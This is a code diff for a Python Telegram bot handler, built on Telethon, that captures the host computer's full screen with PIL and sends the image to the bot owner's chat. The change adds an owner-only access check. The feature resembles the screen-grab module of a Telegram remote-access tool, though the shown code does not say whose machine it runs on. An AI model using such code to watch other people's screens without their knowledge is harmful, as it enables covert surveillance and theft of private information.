@@ -1,14 +1,22 @@
 import os
 from datetime import datetime
 from PIL import ImageGrab
+from telethon import events, Button
+from bot import client
+from config import ownerId
 
-async def handle_screenshot(event):
+@client.on(events.CallbackQuery(data=b"screenshot"))
+async def takeScreenshot(event):
+    if event.sender_id != ownerId:
+        await event.answer("Access denied", alert=True)
+        return
+
     await event.answer("Capturing...", alert=False)
     try:
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        fn = f"screenshot_{ts}.png"
-        ImageGrab.grab().save(fn, "PNG")
-        await event.client.send_file(event.chat_id, fn, caption="Screenshot", force_document=True)
-        os.remove(fn)
+        filename = f"screenshot_{ts}.png"
+        ImageGrab.grab().save(filename, "PNG")
+        await event.client.send_file(event.chat_id, filename, caption=f"{ts}", force_document=True)
+        os.remove(filename)
     except Exception as e:
         await event.answer(f"Failed: {str(e)}", alert=True)
